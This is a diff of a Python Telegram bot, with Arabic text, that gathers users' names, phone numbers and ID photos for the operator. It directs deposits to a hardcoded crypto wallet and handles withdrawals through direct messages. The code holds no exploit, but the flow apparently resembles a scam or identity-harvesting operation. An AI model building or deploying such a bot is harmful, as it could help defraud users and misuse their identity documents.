@@ -1,5 +1,6 @@
 import os
 import threading
+import urllib.parse
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import telebot
 from telebot import types
@@ -159,16 +160,16 @@ def process_phone(message):
     # إرسال البيانات المجمعة كاملة إلى حسابك الخاص عبر البوت
     admin_caption = (
         f"📋 **طلب إنشاء حساب جديد**\n\n"
-        f"🔢 **العميل رقم:** #{client_id_str}\n"
-        f"👤 **الاسم الثلاثي:** {name}\n"
-        f"🔗 **معرف التلغرام:** {custom_username}\n"
-        f"📞 **رقم الهاتف:** {phone}\n"
+        f"🔢 **العميل رقم:** `#{client_id_str}`\n"
+        f"👤 **الاسم الثلاثي:** `{name}`\n"
+        f"🔗 **معرف التلغرام:** `{custom_username}`\n"
+        f"📞 **رقم الهاتف:** `{phone}`\n"
         f"🆔 **ID تلغرام:** `{chat_id}`"
     )
     
     bot.send_message(MY_CHAT_ID, admin_caption, parse_mode="Markdown")
 
-    # إرسال صورتي الهوية إلى حسابك الخاص
+    # إرسال صور الهوية إلى حسابك الخاص
     for i, photo_id in enumerate(photos, 1):
         bot.send_photo(
             MY_CHAT_ID, 
@@ -182,7 +183,8 @@ def process_phone(message):
 
     bot.send_message(
         chat_id, 
-        f"تم استلام جميع بياناتك بنجاح! رقم الطلب الخاص بك هو #{client_id_str}. سيتم مراجعة الطلب والتواصل معك قريباً.", 
+        f"تم استلام جميع بياناتك بنجاح! رقم الطلب الخاص بك هو `{client_id_str}`. سيتم مراجعة الطلب والتواصل معك قريباً.", 
+        parse_mode="Markdown",
         reply_markup=main_keyboard()
     )
 
@@ -190,19 +192,45 @@ def process_phone(message):
 @bot.message_handler(func=lambda msg: msg.text == "2. السحب والإيداع")
 def withdraw_deposit_menu(message):
     markup = types.InlineKeyboardMarkup()
-    btn_withdraw = types.InlineKeyboardButton("سحب", url=f"https://t.me/{MY_USERNAME}?text=اريد%20ان%20أسحب%20أموال")
-    btn_deposit = types.InlineKeyboardButton("إيداع", callback_data="deposit")
+    text_message = urllib.parse.quote("اريد ان اسحب اموال")
+    btn_withdraw = types.InlineKeyboardButton("سحب من حسابي", url=f"https://t.me/{MY_USERNAME}?text={text_message}")
+    btn_deposit = types.InlineKeyboardButton("إيداع بحسابي", callback_data="deposit")
     markup.add(btn_withdraw, btn_deposit)
     bot.send_message(message.chat.id, "اختر العملية المطلوبة:", reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: call.data == "deposit")
 def process_deposit_click(call):
     bot.answer_callback_query(call.id)
-    msg = bot.send_message(
-        call.message.chat.id, 
-        "أرسل عنوانك الخاص (سواءً كان نصاً أو صورة):", 
-        reply_markup=cancel_keyboard()
+    chat_id = call.message.chat.id
+
+    # نص المحفظة مع العنوان الخاطف القابل للنسخ بنقرة واحدة
+    deposit_text = (
+        "📌 **تعليمات الإيداع:**\n\n"
+        "يرجى التحويل إلى عنوان المحفظة التالي:\n"
+        "`TQM9FVW9C4QBE6B4CDwQC8po7m15ygetrM`\n\n"
+        "💡 *اضغط على العنوان أعلاه لنسخه مباشرة.*\n\n"
+        "بعد إتمام التحويل، أرسل إشعار التحويل أو العنوان الخاص بك هنا (كنص أو صورة):"
     )
+
+    qr_file_path = "qr.jpg"
+    
+    if os.path.exists(qr_file_path):
+        with open(qr_file_path, 'rb') as photo:
+            msg = bot.send_photo(
+                chat_id, 
+                photo, 
+                caption=deposit_text, 
+                parse_mode="Markdown", 
+                reply_markup=cancel_keyboard()
+            )
+    else:
+        msg = bot.send_message(
+            chat_id, 
+            deposit_text, 
+            parse_mode="Markdown", 
+            reply_markup=cancel_keyboard()
+        )
+        
     bot.register_next_step_handler(msg, process_deposit_submission)
 
 def process_deposit_submission(message):
@@ -224,9 +252,9 @@ def process_deposit_submission(message):
     )
 
     if message.photo:
-        bot.send_photo(MY_CHAT_ID, message.photo[-1].file_id, caption="صورة الإيداع المرسلة")
+        bot.send_photo(MY_CHAT_ID, message.photo[-1].file_id, caption="صورة إشعار الإيداع المرسلة")
     elif message.text:
-        bot.send_message(MY_CHAT_ID, f"📝 التفاصيل / العنوان:\n{message.text}")
+        bot.send_message(MY_CHAT_ID, f"📝 التفاصيل / العنوان:\n`{message.text}`", parse_mode="Markdown")
 
 # ----------------- 3. مسار خدمة العملاء -----------------
 @bot.message_handler(func=lambda msg: msg.text == "3. خدمة العملاء")
